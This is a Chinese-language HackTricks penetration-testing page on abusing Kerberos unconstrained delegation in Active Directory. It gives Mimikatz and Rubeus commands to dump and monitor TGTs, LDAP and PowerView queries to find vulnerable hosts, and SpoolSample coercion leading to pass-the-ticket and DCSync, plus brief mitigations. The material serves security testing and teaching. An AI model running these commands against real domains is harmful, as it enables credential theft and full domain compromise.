# 无限制委派

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## 无限制委派

这是域管理员可以设置给域内任何**计算机**的功能。然后，每当**用户登录**到计算机上时，该用户的**TGT副本**将被发送到DC提供的TGS中，并保存在LSASS的内存中。因此，如果您在计算机上具有管理员权限，您将能够**转储票据并冒充用户**在任何计算机上。

因此，如果域管理员在启用了"无限制委派"功能的计算机上登录，并且您在该计算机上具有本地管理员权限，则您将能够转储票据并在任何地方冒充域管理员（域提权）。

您可以通过检查[userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx)属性是否包含[ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx)来**查找具有此属性的计算机对象**。您可以使用LDAP过滤器'（userAccountControl:1.2.840.113556.1.4.803:=524288）'来执行此操作，这就是powerview所做的：

<pre class="language-bash"><code class="lang-bash"># 列出无限制计算机
## Powerview
Get-NetComputer -Unconstrained #DCs总是出现但对提权无用
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># 使用Mimikatz导出票据
</strong>privilege::debug
sekurlsa::tickets /export #推荐的方法
kerberos::list /export #另一种方法

# 监视登录并导出新票据
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #每10秒检查新的TGT</code></pre>

使用**Mimikatz**或**Rubeus**将管理员（或受害者用户）的票据加载到内存中，进行[**传递票据攻击**](pass-the-ticket.md)。\
更多信息：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**有关无限制委派的更多信息，请参考ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **强制认证**

如果攻击者能够**入侵允许"无限制委派"的计算机**，他可以**欺骗**一个**打印服务器**自动登录该计算机，并将TGT保存在服务器的内存中。\
然后，攻击者可以执行**传递票据攻击**以冒充用户打印服务器计算机账户。

要使打印服务器登录到任何计算机，您可以使用[**SpoolSample**](https://github.com/leechristensen/SpoolSample)：
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
如果TGT来自域控制器，您可以执行[**DCSync攻击**](acl-persistence-abuse/#dcsync)并获取来自域控制器的所有哈希值。\
[**在ired.team上了解更多关于此攻击的信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**以下是其他尝试强制进行身份验证的方法：**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### 缓解措施

* 限制DA/Admin登录到特定服务
* 对特权帐户设置"帐户是敏感的，不能委派"

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
